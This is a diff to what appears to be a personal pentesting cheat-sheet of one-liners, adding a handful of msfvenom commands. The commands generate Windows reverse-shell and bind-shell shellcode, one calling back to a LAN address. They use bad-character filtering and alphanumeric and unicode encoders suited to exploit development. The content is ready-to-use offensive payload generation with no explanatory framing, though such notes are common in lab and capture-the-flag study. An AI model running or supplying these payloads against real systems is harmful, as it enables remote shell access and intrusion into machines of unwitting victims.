@@ -4,6 +4,13 @@ tidbits and one liners
 # MSFVENOM
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -n 20 -f hex
+msfvenom -p windows/shell_reverse_tcp LHOST=172.16.119.137 LPORT=4444 -b "\x00\x20\x3f\x4f" -f c
+msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=thread -b '\x00' -f hex
+msfvenom -p windows/exec cmd=calc.exe -b "\x00\x0a" -f c
+msfvenom -p generic/custom PAYLOADFILE=egg.bin -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows
+msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed -a x86 --platform windows -f py -v shellcode
+msfvenom -p windows/shell_bind_tcp -f python -v shellcode -a x86 --platform windows -e x86/unicode_upper BufferRegister=EAX
+cat egg.bin | msfvenom -a x86 --platform windows -e x86/alpha_mixed -f py
 ```
 
 # Alpha2
